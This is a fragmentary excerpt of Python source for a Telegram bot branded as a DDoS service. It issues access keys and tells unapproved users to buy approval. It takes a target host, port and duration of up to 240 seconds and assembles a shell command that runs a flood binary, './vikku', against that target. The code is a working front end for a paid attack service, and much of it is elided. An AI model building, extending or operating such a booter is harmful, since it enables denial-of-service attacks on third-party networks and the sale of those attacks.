...
def create_random_key(length=15):
    ...
    custom_key = f"SOURAVISLIVE-{random_key}"
    return custom_key
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝗢𝗨𝗥𝗔𝗩 𝗫 𝗗𝗗𝗢𝗦 𝗯𝗼𝘁 !", reply_markup=markup, parse_mode='Markdown')
    bot.send_message(
        message.chat.id,
...
def handle_attack(message):
    ...
    if user_id in users:
        ...
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n*𝗢𝗼𝗽𝘀! 𝗜𝘁 𝘀𝗲𝗲𝗺𝘀 𝗹𝗶𝗸𝗲 𝘆𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗺𝗮𝗻𝗱. 𝗧𝗼 𝗴𝗮𝗶𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗮𝗻𝗱 𝘂𝗻𝗹𝗲𝗮𝘀𝗵 𝘁𝗵𝗲 𝗽𝗼𝘄𝗲𝗿 𝗼𝗳 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝘆𝗼𝘂 𝗰𝗮𝗻:\n\n👉 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻 𝗔𝗱𝗺𝗶𝗯 𝗼𝗿 𝘁𝗵𝗲 𝗢𝘄𝗻𝗲𝗿 𝗳𝗼𝗿 𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹.\n🌟𝗕𝗲𝗰𝗼𝗺𝗲 𝗮 𝗽𝗿𝗼𝘂𝗱 𝘀𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗿 𝗮𝗻𝗱 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹..\n💬 𝗖𝗵𝗮𝘁 𝘄𝗶𝘁𝗵 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻 𝗻𝗼𝘄 𝗮𝗻𝗱 𝗹𝗲𝘃𝗲𝗹 𝘂𝗽 𝘆𝗼𝘂𝗿 𝗲𝘅𝗽𝗲𝗿𝗶𝗲𝗻𝗰𝗲!n\n𝗟𝗲𝘁𝘀 𝗴𝗲𝘁 𝘆𝗼𝘂 𝘁𝗵𝗿 𝗮𝗰𝗰𝗲𝘀 𝘆𝗼𝘂 𝗻𝗲𝗲𝗱!*"
        bot.reply_to(message, response)
...
def process_attack_details(message):
    ...
    if len(details) == 3:
        ...
        try:
            ...
            time = int(details[2])
            if time > 240:
                response = "❗️𝗘𝗿𝗿𝗼𝗿 : 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗲𝗻 241 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                # Record and log the attack
                record_command_logs(user_id, 'attack', target, port, time)
                log_command(user_id, target, port, time)
                full_command = f"./vikku {target} {port} {time} 1200"
